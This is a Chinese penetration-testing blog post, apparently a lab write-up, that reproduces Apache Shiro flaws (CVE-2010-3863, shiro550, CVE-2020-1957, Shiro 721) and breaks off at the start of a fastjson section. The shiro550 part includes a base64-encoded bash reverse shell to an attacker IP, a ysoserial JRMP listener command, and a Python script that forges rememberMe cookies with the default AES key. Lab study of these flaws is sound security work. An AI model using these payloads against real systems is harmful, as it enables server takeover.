---
title: shiro和fastjson漏洞实操总结 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18813733
source: 博客园 - 渗透测试中心
date: 2025-04-08
fetch_date: 2025-10-06T22:07:40.317203
---

# shiro和fastjson漏洞实操总结 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [shiro和fastjson漏洞实操总结](https://www.cnblogs.com/backlion/p/18813733 "发布于 2025-04-07 22:26")

## Shiro

Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松地开发自己的程序安全代码。

Shiro将目标集中于Shiro开发团队所称的“四大安全基石”-认证（Authentication）、授权（Authorization）、会话管理（Session Management）和加密（Cryptography）

* 认证（Authentication）：用户身份识别。有时可看作为“登录（login）”，它是用户证明自己是谁的一个行为。
* 授权（Authorization）：访问控制过程，好比决定“认证（who）”可以访问“什么（what）”.
* 会话管理（SessionManagement）：管理用户的会话（sessions），甚至在没有WEB或EJB容器的环境中。管理用户与时间相关的状态。
* 加密（Cryptography）：使用加密算法保护数据更加安全，防止数据被偷窥。

@shiro:<https://github.com/vulhub/vulhub/tree/master/shiro>

### CVE-2010-3863：Apache Shiro 认证绕过漏洞

#### 漏洞原理

在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造/、//、/./、/…/ 等绕过权限验证。

#### 影响版本

```
shiro < 1.1.0和JSecurity 0.9.x
```

#### 漏洞复现

访问页面地址为：IP:8080

漏洞点/admin
使用跨目录测试字典fuzz

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222603075-1073907628.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222603723-345239165.png)

### CVE-2016-4437：Apache Shiro 1.2.4反序列化漏洞/shiro550

#### 漏洞原理

属于shiro550漏洞。

Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。

shiro默认使用CookieRememberMeManager，对rememberMe的cookie做了加密处理，在CookieRememberMeManaer类中将cookie中rememberMe字段内容先后进行序列化、AES加密、Base64编码操作。在识别身份的时候，需要对Cookie里的rememberMe字段解密。根据加密的顺序可以推断出解密的顺序为获取==cookie-base64解码-AES解密-反序列化。==

#### 影响版本

Apache Shiro <= 1.2.4

#### 漏洞复现

判断一个页面的登录**是否使用了shiro框架**进行身份验证、授权、密码和会话管理。

判断方法：勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响应包中是否有Set-cookie:rememberMe=deleteMe字段。类似于下图这样。

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222604559-584370896.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222605228-884660278.png)

只要响应包中出现rememberMe=deleteMe字段就说明存在漏洞。这样说片面的，**如果出现rememberMe=deleteMe字段应该是仅仅能说明登录页面采用了shiro进行了身份验证而已，并非直接就说明存在漏洞**

* 未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe= deleteMe 字段
* 不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段
* 勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe=deleteMe字段，还会有remember字段，之后的所有请求中Cookie都会有rememberMe字段
* 或者可以在cookie后面自己加—个rememberMe=1,看返回包有没有rememberMe= deleteMe

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEyOS80NDQ0IDA+JjE=
```

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEyOS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

使用shiro-exploit.py获取shiro的默认key (工具地址：<https://github.com/insightglacier/Shiro_exploit>)

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222607005-380374937.png)

使用shiro.py生成payload(需要自己改key，shiro.py代码如下：)
命令：`shiro.py 192.168.17.132:6666`
shiro.py:

```
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])
print ("rememberMe={0}".format(payload.decode()))
```

python3 shiro.py 192.168.200.129:6666
登录后抓包，替换数据包中的cookie值为shiro.py生成的rememberMe

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222609395-1425325754.png)

### CVE-2020-1957：Apache Shiro 认证绕过漏洞

#### 漏洞原理

我们需要分析我们请求的URL在整个项目的传入传递过程。在使用了shiro的项目中，是我们请求的URL(URL1),进过shiro权限检验(URL2)，最后到springboot项目找到路由来处理(URL3)

漏洞的出现就在URL1，URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL。本例中的漏洞就是因为这个原因产生的。

Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon, authc等拦截器。anon为匿名拦截器，不需要登录即可访问；authc为登录拦截器，需要登录才可以访问。

#### 影响版本

Apache Shiro < 1.5.2

#### 漏洞复现

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222610255-827842090.png)

URL改为/admin会自动跳转到login登录页面

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222611138-598376622.png)

##### 构造恶意请求进行权限绕过

因为代码层面加上;就会识别成绕过 后面加个/也可以
URL改为/xxx/...;/admin/绕过了登录，直接访问成功！

```
/xxx/...;/admin/
```

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222611736-1560197280.png)

### Shiro 721

#### 漏洞复现：CVE-2019-12422

环境：kali linux
docker进行搭建启动

```
git clone https://github.com/3ndz/Shiro-721.git
cd Shiro-721/Docker
docker build -t shiro-721 .
docker run -p 8080:8080 -d shiro-721
```

访问：

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222612334-1749388448.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222613020-467622761.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222613577-1204181089.png)

**如果用正确的账号密码登录，则分别发送两个请求包，分别是POST和GET**
**POST请求包如下图这是（正确账号密码登录得到的包）**

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222614307-349057742.png)

**GET请求包如下图（这是正确密码登录得到的包，主要是向后台提交cookie值）**

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222615074-1860946018.png)
**看到响应包里面有个rememberMe=deleteMe字段，可以说存在shiro反序列化漏洞**

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222615878-1323445775.png)
burp插件增加HaE、Logger++可以查看shiro的指纹

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222616595-78139739.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222617378-1339580696.png)

工具利用：

![image.png](https://img2023.cnblogs.com/blog/1049983/202504/1049983-20250407222618086-213593566.png)

## fastjson

@fastjson:<https://github.com/vulhub/vulhub/tree/master/fastjson>

### 漏洞原理

该漏洞的原理在于Fastjson的反序列化机制。当Fastjson解析JSON数...